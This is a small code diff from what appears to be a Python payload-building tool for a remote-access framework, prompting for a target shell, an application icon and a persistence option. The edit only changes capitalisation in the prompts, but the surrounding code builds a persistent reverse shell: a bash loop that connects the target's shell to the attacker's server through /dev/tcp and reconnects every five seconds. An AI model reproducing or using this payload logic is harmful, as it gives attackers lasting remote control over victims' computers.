@@ -32,10 +32,10 @@ class payload:
 			shell = raw_input(h.info_general_raw("Target shell: ")).strip(" ")
 			while shell == "":
 			    shell = raw_input(h.info_general_raw("Target shell: ")).strip(" ")
-                        icon = raw_input(h.info_general_raw("Application Icon: ")).strip(" ")
+                        icon = raw_input(h.info_general_raw("Application icon: ")).strip(" ")
 			while icon == "":
-			    icon = raw_input(h.info_general_raw("Application Icon: ")).strip(" ")
-			persistence = raw_input(h.info_question_raw("Make Persistent? (y/n): ")).strip(" ").lower()
+			    icon = raw_input(h.info_general_raw("Application icon: ")).strip(" ")
+			persistence = raw_input(h.info_question_raw("Make persistent? (y/n): ")).strip(" ").lower()
 			if persistence == "y":
 				shell_command = "while true; do $("+shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done & "
 				break
